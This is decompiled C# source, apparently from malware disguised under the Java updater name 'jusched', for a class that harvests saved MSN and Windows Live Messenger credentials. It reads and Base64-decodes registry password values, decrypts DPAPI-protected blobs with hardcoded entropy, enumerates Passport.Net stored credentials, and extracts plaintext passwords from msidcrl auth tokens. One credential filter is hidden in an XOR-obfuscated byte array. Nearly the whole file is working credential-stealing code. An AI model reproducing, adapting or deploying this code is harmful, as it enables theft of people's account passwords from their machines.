using System;
using System.Collections;
using System.Collections.Generic;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace jusched;

internal class CMSNMessengerPasswords : CUtils, IEnumerable<CMSNMessengerPassword>
{
	private enum CRED_TYPE
	{
		GENERIC = 1,
		DOMAIN_PASSWORD,
		DOMAIN_CERTIFICATE,
		DOMAIN_VISIBLE_PASSWORD,
		MAXIMUM
	}

	private struct DATA_BLOB
	{
		public int cbData;

		public int pbData;
	}

	private struct FILETIME
	{
		public int dwLowDateTime;

		public int dwHighDateTime;
	}

	private struct CREDENTIAL_ATTRIBUTE
	{
		public int lpstrKeyword;

		public int dwFlags;

		public int dwValueSize;

		public int lpbValue;
	}

	private struct CREDENTIAL
	{
		public int dwFlags;

		public int dwType;

		public int lpstrTargetName;

		public int lpstrComment;

		public FILETIME ftLastWritten;

		public int dwCredentialBlobSize;

		public int lpbCredentialBlob;

		public int dwPersist;

		public int dwAttributeCount;

		public int lpAttributes;

		public int lpstrTargetAlias;

		public int lpUserName;
	}

	private struct MSNPass
	{
		public string strLogin;

		public string strPass;

		public string strTargetName;
	}

	private const int ERROR_SUCCESS = 0;

	private const int HKEY_CURRENT_USER = -2147483647;

	private const int READ_CONTROL = 131072;

	private const int STANDARD_RIGHTS_READ = 131072;

	private const int KEY_QUERY_VALUE = 1;

	private const int KEY_ENUMERATE_SUB_KEYS = 8;

	private const int KEY_NOTIFY = 16;

	private const int SYNCHRONIZE = 1048576;

	private const int STANDARD_RIGHTS_WRITE = 131072;

	private const int KEY_SET_VALUE = 2;

	private const int KEY_CREATE_SUB_KEY = 4;

	private const int KEY_READ = 131097;

	private const int KEY_WRITE = 131078;

	private const int CSIDL_PROGRAM_FILES = 38;

	private List<CMSNMessengerPassword> m_MSNPass;

	[SpecialName]
	private byte[] _0024STATIC_0024Base64Dec_0024201E10E_0024Enc;

	public CMSNMessengerPasswords()
	{
		m_MSNPass = new List<CMSNMessengerPassword>();
	}

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int lstrlenA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int CredEnumerateW([MarshalAs(UnmanagedType.LPWStr)] string lpszFilter, int lFlags, ref int pCount, ref IntPtr lppCredentials);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, EntryPoint = "CredEnumerateW", ExactSpelling = true, SetLastError = true)]
	private static extern int CredEnumerateW_1(IntPtr lpszFilter, int lFlags, ref int pCount, ref IntPtr lppCredentials);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int CredDeleteW([MarshalAs(UnmanagedType.LPWStr)] string lpwstrTargetName, int dwType, int dwFlags);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int CredFree(IntPtr pBuffer);

	[DllImport("crypt32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int CryptUnprotectData(ref DATA_BLOB pDataIn, int ppszDataDescr, ref DATA_BLOB pOptionalEntropy, int pvReserved, int pPromptStruct, int dwFlags, ref DATA_BLOB pDataOut);

	[DllImport("crypt32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int CryptUnprotectData(ref DATA_BLOB pDataIn, int ppszDataDescr, int pOptionalEntropy, int pvReserved, int pPromptStruct, int dwFlags, ref DATA_BLOB pDataOut);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int RegOpenKeyExA(int hKey, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpSubKey, int ulOptions, int samDesired, ref int phkResult);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int RegQueryValueExA(int hKey, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpValueName, int lpReserved, ref int lpType, [MarshalAs(UnmanagedType.LPWStr)] string lpData, ref int lpcbData);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, EntryPoint = "RegQueryValueExA", ExactSpelling = true, SetLastError = true)]
	private static extern int RegQueryValueExA_1(int hKey, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpValueName, int lpReserved, ref int lpType, IntPtr lpData, ref int lpcbData);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int RegEnumKeyExA(int hKey, int dwIndex, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpName, ref int lpcbName, int lpReserved, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpClass, int lpcbClass, ref FILETIME lpftLastWriteTime);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int RegDeleteValueA(int hKey, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpValueName);

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int LocalFree(int hMem);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int RegCloseKey(int hKey);

	[DllImport("shell32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SHGetSpecialFolderLocation(int hwndOwner, int nFolder, ref int pidl);

	[DllImport("shell32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SHGetPathFromIDListA(int pidl, [MarshalAs(UnmanagedType.VBByRefStr)] ref string pszPath);

	[DllImport("msidcrl.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int Initialize(ref Guid guid, int IDCRLVersion, int dwFlags);

	[DllImport("msidcrl.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int EnumIdentitiesWithCachedCredentials([MarshalAs(UnmanagedType.LPWStr)] string wszCachedCredType, ref int phEnumHandle);

	[DllImport("msidcrl.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int NextIdentity(int hEnumHandle, ref IntPtr lpwszMemberName);

	[DllImport("msidcrl.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int PassportFreeMemory(IntPtr ptr);

	[DllImport("msidcrl.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int CloseEnumIdentitiesHandle(int hEnumHandle);

	[DllImport("msidcrl.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int CreateIdentityHandle([MarshalAs(UnmanagedType.LPWStr)] string wszMemberName, int dwFlags, ref int lphExternalIdentity);

	[DllImport("msidcrl.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int CreateIdentityHandle(IntPtr wszMemberName, int dwFlags, ref int lphExternalIdentity);

	[DllImport("msidcrl.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int HasPersistedCredential(int hExternalIdentity, [MarshalAs(UnmanagedType.LPWStr)] string wszCredType, ref int lpbPersisted);

	[DllImport("msidcrl.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int RemovePersistedCredential(int hExternalIdentity, [MarshalAs(UnmanagedType.LPWStr)] string wszCredType);

	[DllImport("msidcrl.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetIdentityPropertyByName(int hExternalIdentity, [MarshalAs(UnmanagedType.LPWStr)] string wszPropertyName, ref int lpszValue);

	[DllImport("msidcrl.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int BuildAuthTokenRequest(int hExternalIdentity, [MarshalAs(UnmanagedType.LPWStr)] string wszPolicy, int dwFlags, ref IntPtr lpReturn);

	[DllImport("msidcrl.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int CloseIdentityHandle(int hExternalIdentity);

	[DllImport("msidcrl.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int Uninitialize();

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpLibFileName);

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int FreeLibrary(int hLibModule);

	private string getProgramFilesFolderPath()
	{
		int pidl = default(int);
		string result;
		if (SHGetSpecialFolderLocation(0, 38, ref pidl) == 0)
		{
			string pszPath = new string('\0', 512);
			int num = SHGetPathFromIDListA(pidl, ref pszPath);
			result = Strings.Left(pszPath, checked(Strings.InStr(pszPath, "\0", (CompareMethod)0) - 1));
		}
		else
		{
			result = null;
		}
		LocalFree(pidl);
		return result;
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void getMSN75Passwords()
	{
		string lpLibFileName = getProgramFilesFolderPath() + "\\MSN Messenger\\msidcrl.dll";
		if (Operators.CompareString(FileSystem.Dir(lpLibFileName, (FileAttribute)0), (string)null, false) == 0)
		{
			return;
		}
		int hLibModule = LoadLibraryA(ref lpLibFileName);
		Guid guid = new Guid(1896408858, -26330, 20427, new byte[8] { 188, 201, 154, 157, 63, 50, 228, 35 });
		Initialize(ref guid, 1, 15);
		int phEnumHandle = default(int);
		IntPtr lpwszMemberName = default(IntPtr);
		int lphExternalIdentity = default(int);
		int lpbPersisted = default(int);
		if (EnumIdentitiesWithCachedCredentials("ps:password", ref phEnumHandle) == 0)
		{
			IntPtr lpReturn = default(IntPtr);
			for (int num = NextIdentity(phEnumHandle, ref lpwszMemberName); num == 0; num = NextIdentity(phEnumHandle, ref lpwszMemberName))
			{
				num = CreateIdentityHandle(lpwszMemberName, 255, ref lphExternalIdentity);
				if ((num == 0) & (lpwszMemberName != IntPtr.Zero))
				{
					num = HasPersistedCredential(lphExternalIdentity, "ps:password", ref lpbPersisted);
					if (num == 0 && lpbPersisted != 0)
					{
						checked
						{
							if (BuildAuthTokenRequest(lphExternalIdentity, "ps:password", 0, ref lpReturn) == 0)
							{
								string text = CopyString(lpReturn);
								int num2 = Strings.InStr(text, "<wsse:Password>", (CompareMethod)0) + 15;
								int num3 = Strings.InStr(text, "</wsse:Password>", (CompareMethod)0);
								if (num3 > 0)
								{
									List<CMSNMessengerPassword> mSNPass = m_MSNPass;
									string szLogin = CopyString(lpwszMemberName);
									string szPassword = Strings.Mid(text, num2, num3 - num2);
									string szTargetName = "ps:" + CopyString(lpwszMemberName);
									mSNPass.Add(new CMSNMessengerPassword(ref szLogin, ref szPassword, ref szTargetName));
								}
							}
							if (lpReturn != IntPtr.Zero)
							{
								PassportFreeMemory(lpReturn);
							}
						}
					}
					num = CloseIdentityHandle(lphExternalIdentity);
				}
				if (lpwszMemberName != IntPtr.Zero)
				{
					PassportFreeMemory(lpwszMemberName);
				}
			}
		}
		CloseEnumIdentitiesHandle(phEnumHandle);
		if (EnumIdentitiesWithCachedCredentials("ps:membernameonly", ref phEnumHandle) == 0)
		{
			for (int num = NextIdentity(phEnumHandle, ref lpwszMemberName); num == 0; num = NextIdentity(phEnumHandle, ref lpwszMemberName))
			{
				num = CreateIdentityHandle(lpwszMemberName, 255, ref lphExternalIdentity);
				if ((num == 0) & (lpwszMemberName != IntPtr.Zero))
				{
					num = HasPersistedCredential(lphExternalIdentity, "ps:password", ref lpbPersisted);
					if (num == 0 && lpbPersisted == 0)
					{
						List<CMSNMessengerPassword> mSNPass2 = m_MSNPass;
						string szTargetName = CopyString(lpwszMemberName);
						string szPassword = string.Empty;
						string szLogin = "ps:" + CopyString(lpwszMemberName);
						mSNPass2.Add(new CMSNMessengerPassword(ref szTargetName, ref szPassword, ref szLogin));
					}
					num = CloseIdentityHandle(lphExternalIdentity);
				}
				if (lpwszMemberName != IntPtr.Zero)
				{
					PassportFreeMemory(lpwszMemberName);
				}
			}
		}
		CloseEnumIdentitiesHandle(phEnumHandle);
		Uninitialize();
		FreeLibrary(hLibModule);
	}

	public void Refresh()
	{
		m_MSNPass.Clear();
		string lpSubKey = "Software\\Microsoft\\MessengerService";
		int phkResult = default(int);
		int num = RegOpenKeyExA(-2147483647, ref lpSubKey, 0, 131097, ref phkResult);
		int lpcbData = 0;
		int hKey = phkResult;
		lpSubKey = "PasswordMSN Messenger Service";
		int lpType = default(int);
		num = RegQueryValueExA_1(hKey, ref lpSubKey, 0, ref lpType, IntPtr.Zero, ref lpcbData);
		checked
		{
			string text;
			if (lpcbData > 0)
			{
				IntPtr intPtr = Marshal.AllocHGlobal(lpcbData);
				int hKey2 = phkResult;
				lpSubKey = "PasswordMSN Messenger Service";
				num = RegQueryValueExA_1(hKey2, ref lpSubKey, 0, ref lpType, intPtr, ref lpcbData);
				text = Marshal.PtrToStringAnsi(intPtr);
				Marshal.FreeHGlobal(intPtr);
				text = Strings.Mid(text, 1, Strings.Len(text) - 1);
				string szPassword = Base64Dec(ref text);
				lpcbData = 0;
				int hKey3 = phkResult;
				lpSubKey = "UserMSN Messenger Service";
				num = RegQueryValueExA_1(hKey3, ref lpSubKey, 0, ref lpType, IntPtr.Zero, ref lpcbData);
				intPtr = Marshal.AllocHGlobal(lpcbData);
				int hKey4 = phkResult;
				lpSubKey = "UserMSN Messenger Service";
				num = RegQueryValueExA_1(hKey4, ref lpSubKey, 0, ref lpType, intPtr, ref lpcbData);
				string text2 = Marshal.PtrToStringAnsi(intPtr);
				Marshal.FreeHGlobal(intPtr);
				text2 = Strings.Mid(text2, 1, Strings.Len(text2) - 1);
				List<CMSNMessengerPassword> mSNPass = m_MSNPass;
				lpSubKey = string.Empty;
				mSNPass.Add(new CMSNMessengerPassword(ref text2, ref szPassword, ref lpSubKey));
				RegCloseKey(phkResult);
			}
			RegCloseKey(phkResult);
			lpSubKey = "Software\\Microsoft\\MSNMessenger";
			DATA_BLOB pDataIn = default(DATA_BLOB);
			DATA_BLOB pDataOut = default(DATA_BLOB);
			if (RegOpenKeyExA(-2147483647, ref lpSubKey, 0, 131097, ref phkResult) == 0)
			{
				lpcbData = 0;
				int hKey5 = phkResult;
				lpSubKey = "Password.NET Messenger Service";
				if (RegQueryValueExA_1(hKey5, ref lpSubKey, 0, ref lpType, IntPtr.Zero, ref lpcbData) == 0)
				{
					IntPtr intPtr = Marshal.AllocHGlobal(lpcbData);
					int hKey6 = phkResult;
					lpSubKey = "Password.NET Messenger Service";
					if (RegQueryValueExA_1(hKey6, ref lpSubKey, 0, ref lpType, intPtr, ref lpcbData) != 0)
					{
						return;
					}
					pDataIn.pbData = intPtr.ToInt32() + 2;
					pDataIn.cbData = lpcbData - 2;
					CryptUnprotectData(ref pDataIn, 0, 0, 0, 0, 1, ref pDataOut);
					string Base64String = Marshal.PtrToStringAnsi(intPtr);
					Marshal.FreeHGlobal(intPtr);
					string szPassword2 = Base64Dec(ref Base64String);
					lpcbData = 0;
					int hKey7 = phkResult;
					lpSubKey = "User.NET Messenger Service";
					num = RegQueryValueExA_1(hKey7, ref lpSubKey, 0, ref lpType, IntPtr.Zero, ref lpcbData);
					intPtr = Marshal.AllocHGlobal(lpcbData);
					int hKey8 = phkResult;
					lpSubKey = "User.NET Messenger Service";
					num = RegQueryValueExA_1(hKey8, ref lpSubKey, 0, ref lpType, intPtr, ref lpcbData);
					string text3 = Marshal.PtrToStringAnsi(intPtr);
					Marshal.FreeHGlobal(intPtr);
					text3 = Strings.Mid(text3, 1, Strings.Len(text3) - 1);
					List<CMSNMessengerPassword> mSNPass2 = m_MSNPass;
					lpSubKey = string.Empty;
					mSNPass2.Add(new CMSNMessengerPassword(ref text3, ref szPassword2, ref lpSubKey));
					LocalFree(pDataOut.pbData);
				}
			}
			text = "Passport.Net\\*";
			int pCount = default(int);
			IntPtr lppCredentials = default(IntPtr);
			CredEnumerateW(text, 0, ref pCount, ref lppCredentials);
			CREDENTIAL cREDENTIAL = default(CREDENTIAL);
			CREDENTIAL cREDENTIAL2 = default(CREDENTIAL);
			int num6;
			if (pCount > 0)
			{
				DATA_BLOB pOptionalEntropy = default(DATA_BLOB);
				pOptionalEntropy.cbData = 74;
				IntPtr intPtr2 = Marshal.AllocHGlobal(74);
				string text4 = "82BD0E67-9FEA-4748-8672-D5EFE5B779B0\0";
				int num2 = 0;
				int num3;
				do
				{
					Marshal.WriteInt16(intPtr2, num2 * 2, (short)(Strings.Asc(Strings.Mid(text4, num2 + 1, 1)) * 4));
					num2++;
					num3 = num2;
					int num4 = 36;
				}
				while (num3 <= 36);
				pOptionalEntropy.pbData = intPtr2.ToInt32();
				int num5 = pCount - 1;
				num6 = 0;
				while (true)
				{
					int num7 = num6;
					int num4 = num5;
					if (num7 > num4)
					{
						break;
					}
					IntPtr intPtr = Marshal.ReadIntPtr(lppCredentials, num6 * 4);
					object? obj = Marshal.PtrToStructure(intPtr, cREDENTIAL.GetType());
					cREDENTIAL = ((obj != null) ? ((CREDENTIAL)obj) : cREDENTIAL2);
					pDataIn.pbData = cREDENTIAL.lpbCredentialBlob;
					pDataIn.cbData = cREDENTIAL.dwCredentialBlobSize;
					pDataOut.cbData = 0;
					pDataOut.pbData = 0;
					CryptUnprotectData(ref pDataIn, 0, ref pOptionalEntropy, 0, 0, 0, ref pDataOut);
					List<CMSNMessengerPassword> mSNPass3 = m_MSNPass;
					IntPtr ptr = new IntPtr(cREDENTIAL.lpUserName);
					lpSubKey = CopyString(ptr);
					IntPtr ptr2 = new IntPtr(pDataOut.pbData);
					string szPassword3 = CopyString(ptr2);
					IntPtr ptr3 = new IntPtr(cREDENTIAL.lpstrTargetName);
					string szTargetName = CopyString(ptr3);
					mSNPass3.Add(new CMSNMessengerPassword(ref lpSubKey, ref szPassword3, ref szTargetName));
					LocalFree(pDataOut.pbData);
					num6++;
				}
				Marshal.FreeHGlobal(intPtr2);
			}
			CredFree(lppCredentials);
			getMSN75Passwords();
			RegCloseKey(phkResult);
			byte[] array = new byte[18]
			{
				38, 48, 111, 102, 81, 101, 56, 82, 98, 108,
				78, 100, 103, 110, 90, 83, 85, 74
			};
			IntPtr intPtr3 = Marshal.AllocHGlobal(38);
			num6 = 0;
			int num8;
			do
			{
				byte val = (byte)(unchecked((int)checked((byte)(array[17 - num6] ^ 0xC))) + (17 - num6));
				Marshal.WriteInt16(intPtr3, num6 * 2, val);
				num6++;
				num8 = num6;
				int num4 = 17;
			}
			while (num8 <= 17);
			Marshal.WriteInt16(intPtr3, 36, 0);
			CredEnumerateW_1(intPtr3, 0, ref pCount, ref lppCredentials);
			if (pCount > 0)
			{
				int num9 = pCount - 1;
				num6 = 0;
				while (true)
				{
					int num10 = num6;
					int num4 = num9;
					if (num10 > num4)
					{
						break;
					}
					IntPtr intPtr = Marshal.ReadIntPtr(lppCredentials, num6 * 4);
					object? obj2 = Marshal.PtrToStructure(intPtr, cREDENTIAL.GetType());
					cREDENTIAL = ((obj2 != null) ? ((CREDENTIAL)obj2) : cREDENTIAL2);
					pDataIn.pbData = cREDENTIAL.lpbCredentialBlob;
					pDataIn.cbData = cREDENTIAL.dwCredentialBlobSize;
					CryptUnprotectData(ref pDataIn, 0, 0, 0, 0, 1, ref pDataOut);
					pDataOut.pbData = pDataIn.pbData;
					List<CMSNMessengerPassword> mSNPass4 = m_MSNPass;
					IntPtr ptr3 = new IntPtr(cREDENTIAL.lpUserName);
					string szTargetName = CopyString(ptr3);
					IntPtr ptr2 = new IntPtr(pDataOut.pbData);
					string szPassword3 = Marshal.PtrToStringUni(ptr2, (int)Math.Round((double)pDataIn.cbData / 2.0));
					IntPtr ptr = new IntPtr(cREDENTIAL.lpstrTargetName);
					lpSubKey = CopyString(ptr);
					mSNPass4.Add(new CMSNMessengerPassword(ref szTargetName, ref szPassword3, ref lpSubKey));
					num6++;
				}
			}
			CredFree(lppCredentials);
			Marshal.FreeHGlobal(intPtr3);
		}
	}

	private void DeleteAllCred(string lpszCredPattern)
	{
		int pCount = default(int);
		IntPtr lppCredentials = default(IntPtr);
		CredEnumerateW(lpszCredPattern, 0, ref pCount, ref lppCredentials);
		checked
		{
			if (pCount > 0)
			{
				int num = pCount - 1;
				int num2 = 0;
				CREDENTIAL cREDENTIAL = default(CREDENTIAL);
				CREDENTIAL cREDENTIAL2 = default(CREDENTIAL);
				while (true)
				{
					int num3 = num2;
					int num4 = num;
					if (num3 > num4)
					{
						break;
					}
					IntPtr ptr = Marshal.ReadIntPtr(lppCredentials, num2 * 4);
					object? obj = Marshal.PtrToStructure(ptr, cREDENTIAL.GetType());
					cREDENTIAL = ((obj != null) ? ((CREDENTIAL)obj) : cREDENTIAL2);
					IntPtr ptr2 = new IntPtr(cREDENTIAL.lpstrTargetName);
					string lpwstrTargetName = CopyString(ptr2);
					CredDeleteW(lpwstrTargetName, cREDENTIAL.dwType, cREDENTIAL.dwFlags);
					num2++;
				}
			}
			CredFree(lppCredentials);
		}
	}

	private string Base64Dec(ref string Base64String)
	{
		byte[] array = new byte[256];
		if (_0024STATIC_0024Base64Dec_0024201E10E_0024Enc.Length == 0)
		{
			_0024STATIC_0024Base64Dec_0024201E10E_0024Enc = Encoding.ASCII.GetBytes("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/");
		}
		int num = 0;
		checked
		{
			int num2;
			do
			{
				array[num] = 64;
				num++;
				num2 = num;
				int num3 = 255;
			}
			while (num2 <= 255);
			num = 0;
			int num4;
			do
			{
				array[_0024STATIC_0024Base64Dec_0024201E10E_0024Enc[num]] = (byte)num;
				num++;
				num4 = num;
				int num3 = 63;
			}
			while (num4 <= 63);
			int num5 = Strings.Len(Base64String);
			byte[] bytes = Encoding.ASCII.GetBytes(Base64String);
			byte[] array2 = (byte[])Utils.CopyArray((Array)array2, (Array)new byte[unchecked(num5 / 4) * 3 - 1 + 1]);
			int num6 = Information.UBound((Array)bytes, 1);
			num = 0;
			int num8 = default(int);
			while (true)
			{
				int num7 = num;
				int num3 = num6;
				if (num7 > num3)
				{
					break;
				}
				array2[num8] = (byte)((unchecked((int)array[bytes[num]]) * 4) | unchecked((int)array[bytes[checked(num + 1)]] / 16));
				num8++;
				array2[num8] = (byte)(((short)(array[bytes[num + 1]] & 0xF) * 16) | unchecked((int)array[bytes[checked(num + 2)]] / 4));
				num8++;
				array2[num8] = (byte)(((short)(array[bytes[num + 2]] & 3) * 64) | array[bytes[num + 3]]);
				num8++;
				num += 4;
			}
			num8 = ((bytes[num5 - 2] == 61) ? 2 : ((bytes[num5 - 1] == 61) ? 1 : 0));
			array2 = (byte[])Utils.CopyArray((Array)array2, (Array)new byte[Information.UBound((Array)array2, 1) - num8 + 1]);
			return Encoding.ASCII.GetString(array2);
		}
	}

	public IEnumerator<CMSNMessengerPassword> GetEnumerator()
	{
		Refresh();
		return m_MSNPass.GetEnumerator();
	}

	public IEnumerator GetEnumerator1()
	{
		Refresh();
		return m_MSNPass.GetEnumerator();
	}

	IEnumerator IEnumerable.GetEnumerator()
	{
		//ILSpy generated this explicit interface implementation from .override directive in GetEnumerator1
		return this.GetEnumerator1();
	}
}
